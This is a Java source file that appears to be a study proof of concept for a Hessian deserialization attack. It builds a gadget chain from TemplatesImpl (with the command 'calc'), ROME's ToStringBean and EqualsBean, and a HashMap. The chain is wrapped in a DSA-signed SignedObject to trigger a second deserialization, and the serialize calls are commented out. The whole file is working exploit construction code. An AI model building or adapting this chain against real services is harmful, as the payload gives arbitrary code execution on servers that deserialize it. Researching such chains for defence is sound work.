package Seri.Hessian;

import Seri.Utils;
import com.caucho.hessian.io.HessianInput;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.HashMap;

import static Seri.Utils.*;

public class HessianDemo {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
        HashMap hashMap = new HashMap();
        hashMap.put(equalsBean,123);

        // 生成公钥
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.generateKeyPair();
        SignedObject signedObject = new SignedObject(
                hashMap,
                keyPair.getPrivate(),
                Signature.getInstance("DSA")
        );

//        serialize(signedObject ,"bin/HessianBAVEE.bin");
//        unserialize("bin/HessianBAVEE.bin");

    }
}
